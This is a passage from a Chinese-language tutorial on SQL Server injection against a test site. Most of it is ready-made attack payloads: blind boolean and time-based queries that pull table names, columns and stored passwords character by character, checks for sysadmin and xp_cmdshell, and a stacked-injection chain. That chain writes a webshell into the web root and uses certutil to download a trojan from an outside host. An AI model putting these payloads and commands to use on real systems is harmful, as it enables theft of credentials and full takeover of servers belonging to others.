    当爆破到第10个字符的时候，发现>0都不正常显示，说明不存在第10位
    爆破得到表名为：dbo.users
    如果有第二个表，第三个表...
    爆破第二个表的第一个字符的ascii值
    AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(test..sysusers.name+CHAR(46)+test..sysobjects.name AS NVARCHAR(4000)),CHAR(32)) FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) AND test..sysusers.name+CHAR(46)+test..sysobjects.name NOT IN (SELECT TOP 1 test..sysusers.name+CHAR(46)+test..sysobjects.name FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name),1,1))>N
    爆破第二个表的第二个字符的ascii值
    AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(test..sysusers.name+CHAR(46)+test..sysobjects.name AS NVARCHAR(4000)),CHAR(32)) FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) AND test..sysusers.name+CHAR(46)+test..sysobjects.name NOT IN (SELECT TOP 1 test..sysusers.name+CHAR(46)+test..sysobjects.name FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name),2,1))>N
    爆破第二个表的第三个字符的ascii值
    AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(test..sysusers.name+CHAR(46)+test..sysobjects.name AS NVARCHAR(4000)),CHAR(32)) FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) AND test..sysusers.name+CHAR(46)+test..sysobjects.name NOT IN (SELECT TOP 1 test..sysusers.name+CHAR(46)+test..sysobjects.name FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name),3,1))>N
    ......
    爆破第三个表的第一个字符的ascii值
    AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(test..sysusers.name+CHAR(46)+test..sysobjects.name AS NVARCHAR(4000)),CHAR(32)) FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) AND test..sysusers.name+CHAR(46)+test..sysobjects.name NOT IN (SELECT TOP 2 test..sysusers.name+CHAR(46)+test..sysobjects.name FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name),1,1))>N
    爆破第三个表的第二个字符的ascii值
    AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(test..sysusers.name+CHAR(46)+test..sysobjects.name AS NVARCHAR(4000)),CHAR(32)) FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) AND test..sysusers.name+CHAR(46)+test..sysobjects.name NOT IN (SELECT TOP 2 test..sysusers.name+CHAR(46)+test..sysobjects.name FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name),2,1))>N
    爆破第三个表的第三个字符的ascii值
    AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(test..sysusers.name+CHAR(46)+test..sysobjects.name AS NVARCHAR(4000)),CHAR(32)) FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) AND test..sysusers.name+CHAR(46)+test..sysobjects.name NOT IN (SELECT TOP 2 test..sysusers.name+CHAR(46)+test..sysobjects.name FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name),3,1))>N
这里我们爆出了test数据库中存在 dbo.users 表
**爆破test数据库中user表的字段数**
    and (select count(name) from test..syscolumns where id=(select id from test..sysobjects where name='users'))=3  #正常显示
    所以users表有3个字段
这里我们爆出了test数据库中users表有3个字段
**爆破test数据库中users表的字段名**
    爆破test数据库中user表的第一个字段名的长度
    and len((select top 1 col_name(object_id('users'),1) from test..sysobjects))>1  正常显示
    and len((select top 1 col_name(object_id('users'),1) from test..sysobjects))>2  不正常显示
    所以users表的第一个字段名长度为2
    爆破test数据库中user表的第一个字段的第一个字符的ascii值,二分法
    and ascii(substring((select top 1 col_name(object_id('users'),1) from test..sysobjects),1,1))>N
    爆破test数据库中user表的第一个字段的第二个字符的ascii值：
    and ascii(substring((select top 1 col_name(object_id('users'),1) from test..sysobjects),2,1))>N
    ........
    最后得到第一个字段为：id
    爆破test数据库中user表的第二个字段名的长度
    and len((select top 1 col_name(object_id('users'),2) from test..sysobjects))>N
    爆破test数据库中user表的第二个字段的第一个字符的ascii值：
    and ascii(substring((select top 1 col_name(object_id('users'),2) from test..sysobjects),1,1))>N
    爆破test数据库中user表的第二个字段的第二个字符的ascii值：
    and ascii(substring((select top 1 col_name(object_id('users'),2) from test..sysobjects),2,1))>N
    爆破test数据库中user表的第三个字段的第三个字符的ascii值：
    and ascii(substring((select top 1 col_name(object_id('users'),2) from test..sysobjects),3,1))>N
    爆破test数据库中user表的第三个字段名的长度
    and len((select top 1 col_name(object_id('users'),3) from test..sysobjects))>N
    ........
这里假设我们爆出了users表的三个字段名：id，username，password
**爆test数据库user表中数据总条数**
    and (select count(*) from test..users)=N
由图可知只有四条数据
**爆破test数据库中user表中password列中的数据**
这里爆破数据的时候，不能爆破数据的长度，所以只能爆破数据的一个一个字符。当爆破到第某个字符出现其ascii值>0都不正常显示时，说明这个字符位不存在，所以到前一位为止。
    爆破test数据库中users表中password列中第一行数据的第一个字符的ascii值
    and unicode(substring((select isnull(cast(password as nvarchar(4000)),char(32)) from(select password, row_number() over (order by (select 1)) as limit from test.dbo.users)x where limit=1),1,1))>N
    爆破test数据库中user表中password列中第一行数据的第二个字符的ascii值
    and unicode(substring((select isnull(cast(password as nvarchar(4000)),char(32)) from(select password, row_number() over (order by (select 1)) as limit from test.dbo.users)x where limit=1),2,1))>N
    爆破test数据库中user表中password列中第一行数据的第三个字符的ascii值
    and unicode(substring((select isnull(cast(password as nvarchar(4000)),char(32)) from(select password, row_number() over (order by (select 1)) as limit from test.dbo.users)x where limit=1),3,1))>N
    爆破test数据库中user表中password列中第一行数据的第四个字符的ascii值
    and unicode(substring((select isnull(cast(password as nvarchar(4000)),char(32)) from(select password, row_number() over (order by (select 1)) as limit from test.dbo.users)x where limit=1),4,1))>N
    当爆破到第5个字符的时候，发现ascii>0都不正常显示，说明，第一个数据长度为4
    最后爆出test数据库users表password列的第一条数据是：root
    爆破test数据库中user表中password列中第二行数据的第一个字符的ascii值
    and unicode(substring((select isnull(cast(password as nvarchar(4000)),char(32)) from(select password, row_number() over (order by (select 1)) as limit from test.dbo.users)x where limit=2),1,1))>N
    爆破test数据库中user表中password列中第二行数据的第二个字符的ascii值
    and unicode(substring((select isnull(cast(password as nvarchar(4000)),char(32)) from(select password, row_number() over (order by (select 1)) as limit from test.dbo.users)x where limit=2),2,1))>N
    爆破test数据库中user表中password列中第二行数据的第三个字符的ascii值
    and unicode(substring((select isnull(cast(password as nvarchar(4000)),char(32)) from(select password, row_number() over (order by (select 1)) as limit from test.dbo.users)x where limit=2),3,1))>N
    ........
## 延时注入
    判断是否是SA权限
    if(1=(select is_srvrolemember('sysadmin'))) WAITFOR DELAY '0:0:2'
    判断是否是站库分离(延时后返回正确页面，确定站库没有分离)
    if(host_name()=@@servername) WAITFOR DELAY '0:0:2'
    判断数据库的个数
    IF(UNICODE(SUBSTRING((SELECT ISNULL(CAST(LTRIM(STR(COUNT(name))) AS NVARCHAR(4000)),CHAR(32)) FROM master..sysdatabases),1,1))=55) WAITFOR DELAY '0:0:2' 
    判断是否开启xp_cmdshell
    if(1=(select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell')) WAITFOR DELAY '0:0:2'--    
    更多延时注入payload，可以查看sqlmap
根据响应时间判断执行是否正确
## Union联合查询
    首先order by查看有几列
    1 order by 3  正常显示
    1 order by 4  不正常显示
    说明有3列
    然后我们可以select NULL,NULL,想查询的数据
查询数据库版本
查询机器名
查询所有数据库名
堆叠注入
SQLServer堆叠注入，由于执行的命令没有回显，所以需要结合时间盲注来查询数据。由于堆叠查询的语句会被执行，所以下面的SQLServer获取权限的奇淫技巧，就是利用到了堆叠注入这一特性。
## SQLServer获取权限的奇淫技巧
利用前提：
  1. 目标网站注入支持堆叠注入
  2. 当前权限是SA权限
  3. 使用sqlmap的 –os-shell 无法获取到权限
这里很多人就会问了，既然是SA权限，不是可以直接利用xp_cmdshell执行系统命令吗？对，没错，但是你使用xp_cmdshell执行的命令没有回显。我们这个获取权限的思路就是，找到目标网站的绝对路径，然后往绝对路径下写入木马，然后获取权限。
我们这里是通过先找到目标网站的一个文件，然后通过遍历目标服务器的磁盘，找到该文件，将其路径写入自建的表中，然后再读取该表得到网站绝对路径。
这里利用的查找命令是
    查找目标机器C盘下的test.txt文件
    for /r c:\ %i in (test*.txt) do @echo %i   #这里的文件名后缀前那个点一定要加*号
    dir /s /b c:\test.txt
这里假设我们已经知道目标网站下有一个test.txt文件，
    创建表hack，并添加一个tmp的字段
    create table hack (tmp varchar(1000));--   
查看表是否创建成功
    python2 sqlmap.py -u http://192.168.10.20:88/index.php?id=1 -D test --tables
    查找目标机器C盘下的test.txt路径，并将结果写入刚刚创建的hack表的tmp字段
    ;insert into hack(tmp) exec master..xp_cmdshell 'dir /s /b c:\test.txt';--    或
    ;insert into hack(tmp) exec master..xp_cmdshell 'for /r c:\ %i in (test*.txt) do @echo %i';--
以下两条语句均可
读取数据，得到目标网站绝对路径为：C:phpstudywww
    python2 sqlmap.py -u http://192.168.10.20:88/index.php?id=1 -D test -T hack --dump
将一句话木马写入目标网站根目录，并命名为shell.php。注意这里的一句话木马的  前要加上 ^
    1;exec master..xp_cmdshell 'echo ^ > C:\phpstudy\www\shell.php';--
菜刀连接之
如果写入的木马文件连接不上的话，我们还可以通过下面手段使用 certutil 远程下载木马文件，前提是目标机器通公网。
    1;exec master..xp_cmdshell 'certutil -urlcache -split -f http://x.x.x.x/shell.php C:\phpstudy\www\shell2.php';--
连接下载的shell2.php木马即可！
## 还原备份数据库
鼠标右键数据库——>还原数据库
选择源设备，选择我们的备份数据库。然后目标数据库也选择该备份数据库，还原那里打上勾，点击确定即可。